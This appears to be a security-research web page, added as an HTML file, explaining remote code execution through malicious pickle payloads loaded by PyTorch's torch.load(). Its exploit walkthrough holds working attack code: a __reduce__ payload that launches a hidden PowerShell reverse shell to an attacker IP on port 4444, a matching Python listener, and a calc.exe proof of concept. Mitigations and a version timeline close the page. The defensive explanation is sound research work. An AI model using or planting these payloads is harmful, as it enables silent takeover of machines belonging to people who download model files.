@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Weaponizing ML Models: Pickle Deserialization RCE via torch.load()</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #0f0f1a;
+    --border: #1e1e2e;
+    --accent: #ff4d6d;
+    --accent2: #00d4ff;
+    --accent3: #a855f7;
+    --text: #e2e2f0;
+    --muted: #6b6b8a;
+    --code-bg: #080810;
+    --warning: #ffd166;
+    --success: #06d6a0;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* Noise overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.4;
+  }
+
+  .container {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Header */
+  header {
+    padding: 4rem 0 3rem;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 4rem;
+  }
+
+  .tag {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    padding: 0.25rem 0.75rem;
+    margin-bottom: 1.5rem;
+  }
+
+  h1 {
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    font-weight: 800;
+    line-height: 1.15;
+    margin-bottom: 1.5rem;
+    letter-spacing: -0.02em;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .meta {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--muted);
+    display: flex;
+    gap: 2rem;
+  }
+
+  .meta span { color: var(--accent2); }
+
+  /* Sections */
+  section {
+    margin-bottom: 4rem;
+  }
+
+  h2 {
+    font-size: 1.6rem;
+    font-weight: 700;
+    margin-bottom: 1.5rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 2px solid var(--border);
+    position: relative;
+  }
+
+  h2::before {
+    content: '//';
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--accent);
+    margin-right: 0.75rem;
+    font-size: 1rem;
+  }
+
+  h3 {
+    font-size: 1.15rem;
+    font-weight: 700;
+    margin: 2rem 0 1rem;
+    color: var(--accent2);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  p { margin-bottom: 1.25rem; color: #c8c8e0; }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 4px;
+    margin: 1.5rem 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    background: #0d0d18;
+    padding: 0.5rem 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--accent);
+  }
+
+  .code-file {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--muted);
+  }
+
+  pre {
+    padding: 1.25rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.7;
+  }
+
+  .kw { color: #ff79c6; }
+  .fn { color: #50fa7b; }
+  .str { color: #f1fa8c; }
+  .cm { color: #6272a4; font-style: italic; }
+  .cl { color: var(--accent2); }
+  .num { color: #bd93f9; }
+  .var { color: #ffb86c; }
+
+  /* Callout boxes */
+  .callout {
+    padding: 1.25rem 1.5rem;
+    border-radius: 4px;
+    margin: 1.5rem 0;
+    border-left: 4px solid;
+    font-size: 0.9rem;
+  }
+
+  .callout.warning {
+    background: rgba(255, 209, 102, 0.06);
+    border-color: var(--warning);
+    color: var(--warning);
+  }
+
+  .callout.danger {
+    background: rgba(255, 77, 109, 0.06);
+    border-color: var(--accent);
+    color: #ff8fa3;
+  }
+
+  .callout.info {
+    background: rgba(0, 212, 255, 0.06);
+    border-color: var(--accent2);
+    color: #80e9ff;
+  }
+
+  .callout.success {
+    background: rgba(6, 214, 160, 0.06);
+    border-color: var(--success);
+    color: var(--success);
+  }
+
+  .callout strong {
+    display: block;
+    margin-bottom: 0.4rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    opacity: 0.8;
+  }
+
+  /* Attack flow diagram */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin: 2rem 0;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+
+  .flow-step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 0.75rem 1.25rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--text);
+    position: relative;
+    flex: 1;
+    min-width: 120px;
+    text-align: center;
+  }
+
+  .flow-step.red { border-color: var(--accent); color: var(--accent); }
+  .flow-step.blue { border-color: var(--accent2); color: var(--accent2); }
+  .flow-step.purple { border-color: var(--accent3); color: var(--accent3); }
+
+  .flow-arrow {
+    color: var(--muted);
+    font-size: 1.2rem;
+    flex-shrink: 0;
+  }
+
+  /* Inline code */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8em;
+    background: rgba(255,255,255,0.06);
+    padding: 0.15em 0.4em;
+    border-radius: 3px;
+    color: var(--accent2);
+  }
+
+  /* CVE badge */
+  .badge {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 2px;
+    margin-left: 0.5rem;
+    vertical-align: middle;
+  }
+
+  .badge.red { background: rgba(255,77,109,0.15); color: var(--accent); border: 1px solid var(--accent); }
+  .badge.green { background: rgba(6,214,160,0.15); color: var(--success); border: 1px solid var(--success); }
+
+  /* Mitigations grid */
+  .mit-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+
+  .mit-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 1.25rem;
+    border-radius: 4px;
+    transition: border-color 0.2s;
+  }
+
+  .mit-card:hover { border-color: var(--success); }
+
+  .mit-card .mit-icon {
+    font-size: 1.5rem;
+    margin-bottom: 0.75rem;
+  }
+
+  .mit-card h4 {
+    font-size: 0.9rem;
+    font-weight: 700;
+    margin-bottom: 0.5rem;
+    color: var(--success);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .mit-card p {
+    font-size: 0.82rem;
+    color: var(--muted);
+    margin: 0;
+  }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 0;
+    margin-top: 4rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--muted);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  footer span { color: var(--accent2); }
+
+  /* Table */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.5rem 0;
+    font-size: 0.85rem;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  th {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 0.6rem 1rem;
+    text-align: left;
+    color: var(--accent2);
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+
+  td {
+    border: 1px solid var(--border);
+    padding: 0.6rem 1rem;
+    color: #c8c8e0;
+    font-size: 0.78rem;
+  }
+
+  tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1.25rem; }
+  li { color: #c8c8e0; margin-bottom: 0.4rem; }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 1.5rem;
+    margin-bottom: 3rem;
+    border-radius: 4px;
+  }
+
+  .toc h4 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--accent);
+    margin-bottom: 1rem;
+  }
+
+  .toc ol { margin: 0; }
+  .toc li { font-size: 0.85rem; }
+  .toc a { color: var(--accent2); text-decoration: none; }
+  .toc a:hover { color: var(--text); }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="tag">Security Research · ML Supply Chain · RCE</div>
+    <h1>Weaponizing ML Models:<br><span>Pickle Deserialization RCE</span><br>via torch.load()</h1>
+    <div class="meta">
+      <div>SEVERITY <span>CRITICAL</span></div>
+      <div>VECTOR <span>Network / Local</span></div>
+      <div>IMPACT <span>Full RCE</span></div>
+      <div>FIXED IN <span>PyTorch 2.6</span></div>
+    </div>
+  </header>
+
+  <!-- TOC -->
+  <div class="toc">
+    <h4>// Table of Contents</h4>
+    <ol>
+      <li><a href="#background">Background: Python Pickle Protocol</a></li>
+      <li><a href="#attack-surface">Attack Surface: ML Model Distribution</a></li>
+      <li><a href="#technical-analysis">Technical Analysis</a></li>
+      <li><a href="#exploit">Exploit Walkthrough</a></li>
+      <li><a href="#demo">Demo: calc.exe PoC</a></li>
+      <li><a href="#mitigations">Mitigations & Defense</a></li>
+      <li><a href="#timeline">PyTorch Security Timeline</a></li>
+    </ol>
+  </div>
+
+  <!-- Background -->
+  <section id="background">
+    <h2>Background: Python Pickle Protocol</h2>
+    <p>Python's <code>pickle</code> module implements a binary serialization protocol for converting arbitrary Python objects into byte streams and back. While powerful, it was never designed with security in mind — the Python documentation explicitly warns:</p>
+
+    <div class="callout danger">
+      <strong>⚠ Official Python Docs Warning</strong>
+      "The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling."
+    </div>
+
+    <p>The core of the vulnerability lies in the <code>__reduce__</code> dunder method. When Python deserializes a pickled object, it calls <code>__reduce__</code> on that object to reconstruct it. This method returns a tuple of <code>(callable, args)</code> — and Python will call <code>callable(*args)</code> unconditionally during unpickling.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">pickle_internals.py</span>
+      </div>
+      <pre><span class="cm"># How __reduce__ works internally during unpickling</span>
+<span class="cm"># pickle opcode 0x52 (REDUCE) does essentially this:</span>
+
+<span class="kw">def</span> <span class="fn">load_reduce</span>(self):
+    args = self.stack.pop()
+    func = self.stack[-<span class="num">1</span>]
+    self.stack[-<span class="num">1</span>] = func(*args)  <span class="cm"># ← arbitrary code execution here</span>
+
+<span class="cm"># If func = os.system and args = ("calc.exe",)</span>
+<span class="cm"># then os.system("calc.exe") is called — no questions asked</span></pre>
+    </div>
+
+    <p>There is no sandbox, no allowlist, no validation. Any callable reachable in the Python environment can be invoked with any arguments during deserialization.</p>
+  </section>
+
+  <!-- Attack Surface -->
+  <section id="attack-surface">
+    <h2>Attack Surface: ML Model Distribution</h2>
+
+    <p>The ML ecosystem has a significant supply chain problem. Model weights are routinely distributed as <code>.pkl</code>, <code>.pt</code>, or <code>.bin</code> files via:</p>
+
+    <ul>
+      <li>Hugging Face Hub (millions of model files)</li>
+      <li>GitHub repositories</li>
+      <li>Academic paper supplementary materials</li>
+      <li>Internal model registries</li>
+      <li>Pip packages bundling pretrained weights</li>
+    </ul>
+
+    <p><code>torch.load()</code> uses pickle internally to deserialize model state dicts. Prior to PyTorch 2.6, the default behavior was to unpickle without restriction — meaning any downloaded model file was a potential RCE vector.</p>
+
+    <div class="flow">
+      <div class="flow-step red">Attacker crafts<br>malicious .pkl</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step">Upload to<br>HuggingFace/GitHub</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step blue">Victim runs<br>torch.load(path)</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step purple">__reduce__<br>executes</div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step red">Full RCE on<br>victim machine</div>
+    </div>
+
+    <div class="callout warning">
+      <strong>⚡ Real-World Impact</strong>
+      Researchers and ML engineers routinely download and load models from Hugging Face without inspecting the binary contents. A single malicious model uploaded to a typosquatted repository (e.g. <code>bert-base-uncaseed</code> instead of <code>bert-base-uncased</code>) could compromise thousands of machines.
+    </div>
+  </section>
+
+  <!-- Technical Analysis -->
+  <section id="technical-analysis">
+    <h2>Technical Analysis</h2>
+
+    <h3>torch.save() / torch.load() Internals</h3>
+    <p><code>torch.save()</code> uses a ZIP-based format with a magic number header, but the actual tensor data and Python objects within it are serialized using pickle protocol 4. This means a valid-looking <code>.pt</code> file with the correct torch magic bytes can still contain a malicious pickle payload inside the ZIP container.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">torch/serialization.py (simplified)</span>
+      </div>
+      <pre><span class="cm"># torch.load() internals (pre-2.6 default)</span>
+<span class="kw">def</span> <span class="fn">_legacy_load</span>(f, map_location, pickle_module, **kwargs):
+    <span class="cm"># Reads ZIP structure, finds pickle data</span>
+    unpickler = pickle_module.<span class="cl">Unpickler</span>(data_file)
+    <span class="kw">return</span> unpickler.<span class="fn">load</span>()  <span class="cm"># ← unrestricted unpickling</span>
+
+<span class="cm"># torch.load() with weights_only=True (safe)</span>
+<span class="kw">def</span> <span class="fn">_weights_only_unpickler</span>(f):
+    unpickler = <span class="cl">_WeightsOnlyUnpickler</span>(f)
+    <span class="cm"># Only allows: torch.Tensor, numpy arrays,</span>
+    <span class="cm"># basic Python types (dict, list, int, str, float)</span>
+    <span class="cm"># Raises on ANY other callable</span>
+    <span class="kw">return</span> unpickler.<span class="fn">load</span>()</pre>
+    </div>
+
+    <h3>The __reduce__ Contract</h3>
+    <p>When pickle encounters an object during serialization, it calls <code>__reduce__</code> to get reconstruction instructions. The return value can be:</p>
+
+    <table>
+      <tr><th>Return Type</th><th>Meaning</th><th>Security Impact</th></tr>
+      <tr><td><code>str</code></td><td>Global name lookup</td><td>Medium</td></tr>
+      <tr><td><code>(callable, args)</code></td><td>Call callable(*args) on load</td><td>CRITICAL</td></tr>
+      <tr><td><code>(callable, args, state)</code></td><td>+ setstate call</td><td>CRITICAL</td></tr>
+      <tr><td><code>(callable, args, state, list_items, dict_items)</code></td><td>Full reconstruction</td><td>CRITICAL</td></tr>
+    </table>
+
+    <p>For RCE, we return <code>(os.system, ("malicious_command",))</code>. During unpickling, pickle resolves <code>os.system</code> from the <code>os</code> module and calls it with our command string. This happens before any user code runs — purely as a side effect of loading the file.</p>
+  </section>
+
+  <!-- Exploit Walkthrough -->
+  <section id="exploit">
+    <h2>Exploit Walkthrough</h2>
+
+    <h3>Stage 1: Payload Generation (Attacker)</h3>
+    <p>The attacker creates a malicious class with <code>__reduce__</code> returning a reverse shell command, then serializes it with <code>torch.save()</code> to produce a file with valid PyTorch magic bytes:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">attacker_payload.py</span>
+      </div>
+      <pre><span class="kw">import</span> pickle, os, torch
+
+<span class="kw">class</span> <span class="cl">MaliciousModel</span>:
+    <span class="var">ATTACKER_IP</span>   = <span class="str">"192.168.0.180"</span>
+    <span class="var">ATTACKER_PORT</span> = <span class="num">4444</span>
+
+    <span class="kw">def</span> <span class="fn">__reduce__</span>(self):
+        <span class="cm"># This tuple is the deserialization bomb</span>
+        <span class="cm"># pickle will call: os.system(cmd) on the VICTIM machine</span>
+        cmd = (
+            <span class="str">f"powershell -ExecutionPolicy Bypass -nop -w hidden -c \""</span>
+            <span class="str">f"$c=New-Object Net.Sockets.TCPClient('{self.ATTACKER_IP}',{self.ATTACKER_PORT});"</span>
+            <span class="str">f"$s=$c.GetStream();"</span>
+            <span class="str">f"[byte[]]$b=0..65535|%{{0}};"</span>
+            <span class="str">f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"</span>
+            <span class="str">f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"</span>
+            <span class="str">f"$r=(iex $d 2>&1|Out-String);"</span>
+            <span class="str">f"$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\""</span>
+        )
+        <span class="kw">return</span> os.system, (cmd,)
+        <span class="cm"># ↑ os.system(cmd) fires the moment victim calls torch.load()</span>
+
+<span class="cm"># torch.save() wraps the pickle in a valid PyTorch ZIP container</span>
+<span class="cm"># This bypasses naive "check for .pt extension" defenses</span>
+torch.<span class="fn">save</span>(<span class="cl">MaliciousModel</span>(), <span class="str">"model.pkl"</span>)
+<span class="fn">print</span>(<span class="str">"[+] Malicious model.pkl written"</span>)</pre>
+    </div>
+
+    <h3>Stage 2: Listener Setup (Attacker)</h3>
+    <p>A custom Python listener provides an interactive session over the reverse shell connection:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">listener.py</span>
+      </div>
+      <pre><span class="kw">import</span> socket, threading
+
+<span class="kw">def</span> <span class="fn">receive</span>(conn):
+    <span class="kw">while</span> <span class="num">True</span>:
+        <span class="kw">try</span>:
+            data = conn.<span class="fn">recv</span>(<span class="num">4096</span>).<span class="fn">decode</span>(<span class="str">'utf-8'</span>, errors=<span class="str">'ignore'</span>)
+            <span class="kw">if</span> data: <span class="fn">print</span>(data, end=<span class="str">''</span>)
+        <span class="kw">except</span>: <span class="kw">break</span>
+
+s = socket.<span class="cl">socket</span>()
+s.<span class="fn">setsockopt</span>(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="num">1</span>)
+s.<span class="fn">bind</span>((<span class="str">'0.0.0.0'</span>, <span class="num">4444</span>))
+s.<span class="fn">listen</span>(<span class="num">1</span>)
+<span class="fn">print</span>(<span class="str">"[*] Listening on :4444"</span>)
+
+conn, addr = s.<span class="fn">accept</span>()
+<span class="fn">print</span>(<span class="str">f"[+] Shell from {addr}"</span>)
+
+threading.<span class="cl">Thread</span>(target=receive, args=(conn,), daemon=<span class="num">True</span>).<span class="fn">start</span>()
+
+<span class="kw">while</span> <span class="num">True</span>:
+    cmd = <span class="fn">input</span>()
+    <span class="kw">if</span> cmd: conn.<span class="fn">send</span>((cmd + <span class="str">'\n'</span>).<span class="fn">encode</span>())</pre>
+    </div>
+
+    <h3>Stage 3: Victim Triggers RCE</h3>
+    <p>The victim downloads what they believe is a model file and loads it. The <code>weights_only=False</code> flag — required in older PyTorch versions or explicitly set by users following old tutorials — disables the safety check:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">victim.py</span>
+      </div>
+      <pre><span class="kw">import</span> torch
+
+<span class="cm"># Common pattern seen in countless tutorials and codebases</span>
+<span class="cm"># This single line fires the attacker's __reduce__ payload</span>
+model = torch.<span class="fn">load</span>(<span class="str">"model.pkl"</span>, weights_only=<span class="num">False</span>)
+<span class="cm">#                                  ↑ disables safety — attacker wins</span>
+
+<span class="cm"># No exception is raised. The "model" appears to load normally.</span>
+<span class="cm"># Meanwhile, a reverse shell is connecting to 192.168.0.180:4444</span></pre>
+    </div>
+
+    <div class="callout danger">
+      <strong>🔴 Key Insight</strong>
+      The exploit is silent. No exception is raised, no warning is printed. The model appears to load successfully. The reverse shell connection happens as a side effect invisible to the victim.
+    </div>
+  </section>
+
+  <!-- Demo -->
+  <section id="demo">
+    <h2>Demo: calc.exe Proof of Concept</h2>
+    <p>For a benign demonstration proving arbitrary code execution, the payload can be reduced to a single line — launching <code>calc.exe</code> on the victim's Windows machine:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">calc_poc.py</span>
+      </div>
+      <pre><span class="kw">import</span> os, torch
+
+<span class="kw">class</span> <span class="cl">CalcPoC</span>:
+    <span class="kw">def</span> <span class="fn">__reduce__</span>(self):
+        <span class="kw">return</span> os.system, (<span class="str">"calc.exe"</span>,)
+        <span class="cm"># On Linux: return os.system, ("gnome-calculator",)</span>
+
+torch.<span class="fn">save</span>(<span class="cl">CalcPoC</span>(), <span class="str">"innocent_model.pkl"</span>)
+
+<span class="cm"># Victim runs:</span>
+<span class="cm"># torch.load("innocent_model.pkl", weights_only=False)</span>
+<span class="cm"># → Calculator opens. No other indication of compromise.</span></pre>
+    </div>
+
+    <div class="callout info">
+      <strong>ℹ CTF Note</strong>
+      In a CTF context, <code>calc.exe</code> is the canonical benign PoC payload — it visually demonstrates RCE without causing harm, exfiltrating data, or persisting on the system. It's the standard "I own this box" signal.
+    </div>
+  </section>
+
+  <!-- Mitigations -->
+  <section id="mitigations">
+    <h2>Mitigations & Defense</h2>
+
+    <div class="mit-grid">
+      <div class="mit-card">
+        <div class="mit-icon">🛡</div>
+        <h4>weights_only=True</h4>
+        <p>Always use <code>torch.load(path, weights_only=True)</code>. Default since PyTorch 2.6. Allowlists only safe types: tensors, numpy arrays, basic Python primitives.</p>
+      </div>
+      <div class="mit-card">
+        <div class="mit-icon">🔍</div>
+        <h4>Scan Before Load</h4>
+        <p>Use tools like <code>picklescan</code> or <code>modelscan</code> (by ProtectAI) to inspect pickle files for dangerous opcodes before loading.</p>
+      </div>
+      <div class="mit-card">
+        <div class="mit-icon">📦</div>
+        <h4>Prefer SafeTensors</h4>
+        <p>Use Hugging Face's <code>safetensors</code> format instead of <code>.pkl</code>/<code>.pt</code>. It stores only raw tensor data with no executable code path.</p>
+      </div>
+      <div class="mit-card">
+        <div class="mit-icon">🔒</div>
+        <h4>Verify Checksums</h4>
+        <p>Verify SHA256 hashes of downloaded model files against publisher-provided checksums before loading. Never load unsigned model files in production.</p>
+      </div>
+      <div class="mit-card">
+        <div class="mit-icon">🏖</div>
+        <h4>Sandbox Loading</h4>
+        <p>Load untrusted models inside Docker containers, VMs, or restricted environments with no network access and minimal filesystem permissions.</p>
+      </div>
+      <div class="mit-card">
+        <div class="mit-icon">⚙</div>
+        <h4>Upgrade PyTorch</h4>
+        <p>PyTorch ≥ 2.6 sets <code>weights_only=True</code> as the default. Upgrade immediately. Audit any codebase explicitly passing <code>weights_only=False</code>.</p>
+      </div>
+    </div>
+
+    <h3>Secure Loading Pattern</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python</span>
+        <span class="code-file">secure_load.py</span>
+      </div>
+      <pre><span class="kw">import</span> torch
+<span class="kw">from</span> safetensors.torch <span class="kw">import</span> load_file
+
+<span class="cm"># ✅ Option 1: weights_only=True (PyTorch ≥ 2.0)</span>
+model_state = torch.<span class="fn">load</span>(<span class="str">"model.pt"</span>, weights_only=<span class="num">True</span>)
+
+<span class="cm"># ✅ Option 2: safetensors format (recommended for distribution)</span>
+model_state = <span class="fn">load_file</span>(<span class="str">"model.safetensors"</span>)
+
+<span class="cm"># ✅ Option 3: scan first, then load</span>
+<span class="kw">from</span> modelscan.scanner <span class="kw">import</span> <span class="cl">ModelScan</span>
+scanner = <span class="cl">ModelScan</span>()
+result = scanner.<span class="fn">scan</span>(<span class="str">"model.pt"</span>)
+<span class="kw">if not</span> result.issues_found:
+    model_state = torch.<span class="fn">load</span>(<span class="str">"model.pt"</span>, weights_only=<span class="num">True</span>)
+
+<span class="cm"># ❌ NEVER do this with untrusted files</span>
+<span class="cm"># model = torch.load("model.pt", weights_only=False)</span></pre>
+    </div>
+
+    <div class="callout success">
+      <strong>✅ TL;DR Defense</strong>
+      Upgrade to PyTorch ≥ 2.6, never pass <code>weights_only=False</code> on untrusted files, prefer <code>safetensors</code> format for model distribution, and scan with <code>picklescan</code> or <code>modelscan</code> in your CI/CD pipeline.
+    </div>
+  </section>
+
+  <!-- Timeline -->
+  <section id="timeline">
+    <h2>PyTorch Security Timeline</h2>
+
+    <table>
+      <tr><th>Version</th><th>Default weights_only</th><th>Behavior</th></tr>
+      <tr><td>&lt; 2.0</td><td><code>False</code></td><td>Fully unsafe — arbitrary pickle execution</td></tr>
+      <tr><td>2.0 – 2.5</td><td><code>False</code></td><td>Warning added, still unsafe by default</td></tr>
+      <tr><td>≥ 2.6</td><td><code>True</code> <span class="badge green">FIXED</span></td><td>Safe by default — allowlist only</td></tr>
+    </table>
+
+    <p>The fix in 2.6 is a breaking change for users who rely on loading full Python objects (not just tensor weights) from <code>.pt</code> files. Such users must explicitly opt into <code>weights_only=False</code> — making the risk a deliberate, visible choice rather than a silent default.</p>
+  </section>
+
+</div>
+
+<footer class="container">
+  <div>// Pickle Deserialization RCE via torch.load() — Security Research</div>
+  <div>For educational purposes only · <span>CTF / Lab Environment</span></div>
+</footer>
+
+</body>
+</html>
